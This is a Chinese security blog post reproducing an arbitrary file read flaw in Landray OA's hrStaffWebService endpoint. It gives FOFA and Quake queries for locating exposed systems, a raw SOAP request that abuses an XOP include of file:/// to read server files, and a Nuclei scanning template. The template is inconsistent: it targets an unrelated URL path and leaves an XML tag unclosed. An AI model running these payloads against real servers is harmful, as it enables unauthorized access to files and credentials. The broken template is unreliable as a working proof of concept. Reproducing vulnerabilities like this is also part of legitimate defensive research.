#  【漏洞复现】蓝凌OA hrStaffWebService任意文件读取漏洞   
混子Hacker  混子Hacker   2024-11-09 22:30  
  
****  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不承担任何法律及连带责任。  
  
  
[   
漏洞简介   
]  
  
——    
一切都是最好的安排，一定要学会忍耐  
 ——  
  
蓝  
凌OA  
  
蓝凌OA  
软件采用微服务架构，支持高低代码开发，可扩展性强。它内置多种功能模块，如邮件管理、日程安排、文档管理、工作流审批等，满足企业多样化需求。同时，蓝凌OA还支持多系统连接，实现端到端高效业务流程。该系统hrStaffWebService接口存在任意文件读取漏洞。  
  
  
  
  
  
  
漏洞信息  
  
  
  
**混子Hacker**  
  
**01**  
  
资产测绘  
  
  
```
fofa: app="Landray-OA系统"
Quake：app:"蓝凌OA系统"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5oxeTib0PrnX5ibrUe9zzTpO1CSFBVZgBSRokaiaqL818GeViaqAQ5xcMG3A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5oFSjFIKFDQUnOxUR3Iux2FpEgbEFW79iaehfAhc51yibSj8PibLwEv16Lw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**混子Hacker**********  
  
**02**  
  
漏洞复现  
  
  
```
POST /sys/webservice/hrStaffWebService HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: multipart/related; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66
SOAPAction: ""

------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getHrStaffElements>
        <arg0>
            <beginTimeStamp>1</beginTimeStamp>
            <count><xop:Include 
xmlns:xop="http://www.w3.org/2004/08/xop/include" 
href="file:///"/></count>
        </arg0>
    </web:getHrStaffElements>
</soapenv:Body>
</soapenv:Envelope>
------WebKitFormBoundaryk8DbZoq3wNm32b66--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5otd9y1shSibdSZrF5V50fYljKibzibzM3B8BaibZFWwepuabzXOnoZR4Nog/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5oj7J0xVqfEhxA43ZnWQjUVWR4uVGASbia93MvaJfjYqGNlRhvnQa0VgQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**混子Hacker**********  
  
**03**  
  
Nuclei Poc  
  
  
```
id: landray-hrStaffWebService-fileread

info:
  name: landray hrStaffWebService 任意文件读取
  author: thomas
  severity: critical
  metadata:
    fofa-query: app="Landray-OA系统"
  tags: landray,fileread

requests:
  - raw:
      - |
        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
        Content-Type: multipart/related; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66
        SOAPAction: ""

        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="1"
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
            <web:getHrStaffElements>
                <arg0>
                    <beginTimeStamp>1</beginTimeStamp>
                    <count><xop:Include 
        xmlns:xop="http://www.w3.org/2004/08/xop/include" 
        href="file:///"/>
                </arg0>
            </web:getHrStaffElements>
        </soapenv:Body>
        </soapenv:Envelope>
        ------WebKitFormBoundaryk8DbZoq3wNm32b66--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Unmarshalling Error: Not a number"
        part: body
```  
  
  
  
<<<    
END   
>>>  
  
  
  
原创文章｜转载请附上原文出处链接  
  
更多漏洞｜关注作者查看  
  
作者｜混子Hacker  
  
  
  
